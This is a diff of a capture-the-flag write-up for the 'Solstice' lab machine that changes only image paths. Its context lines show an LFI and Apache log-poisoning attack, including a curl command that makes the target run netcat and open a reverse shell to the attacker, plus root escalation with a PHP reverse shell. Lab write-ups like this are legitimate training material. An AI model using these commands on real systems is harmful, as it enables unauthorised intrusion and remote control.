@@ -48,13 +48,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Web PORT : 8593
 
-![img](/assets/images/CTF/Pg-Play/Solstice/web.png)
+![img](/assets/images/CTF/Proving_Grounds/Solstice/web.png)
 
 ## LFI Vulnerability
 
 Clicking on the `Book List` button shows the `index.php?book` location.   
 
-![img](/assets/images/CTF/Pg-Play/Solstice/lfi.png)
+![img](/assets/images/CTF/Proving_Grounds/Solstice/lfi.png)
 
 ## Apache Log Poisoning attack
 
@@ -80,7 +80,7 @@ Execute the below netcat command to obtain reverse shell. Ensure netcat listener
 curl -s "http://192.168.180.72:8593/index.php?book=../../../../../../var/log/apache2/access.log&cmd=nc%20192.168.45.197%204444%20-e%20%2Fbin%2Fbash%20"
 ```
 
-![img](/assets/images/CTF/Pg-Play/Solstice/shell.png)
+![img](/assets/images/CTF/Proving_Grounds/Solstice/shell.png)
 
 **Initial Foothold obtained**
 
@@ -94,13 +94,13 @@ Check the running process with root permissions.
 ps aux | grep root
 ```
 
-![img](/assets/images/CTF/Pg-Play/Solstice/ps.png)
+![img](/assets/images/CTF/Proving_Grounds/Solstice/ps.png)
 
 PHP is running as root, in order to get a shell as `root` the index.php file located in the `/var/tmp/sv/` folder has to be replaced with a php reverse shell.
 
 Download the pentest monkey php reverse shell into the folder and rename it as `index.php`. Once the file is downloaded and renamed then run internal curl command to execute the php file to obtain the reverse shell.
 
-![img](/assets/images/CTF/Pg-Play/Solstice/root.png)
+![img](/assets/images/CTF/Proving_Grounds/Solstice/root.png)
 
 **Root obtained**
 
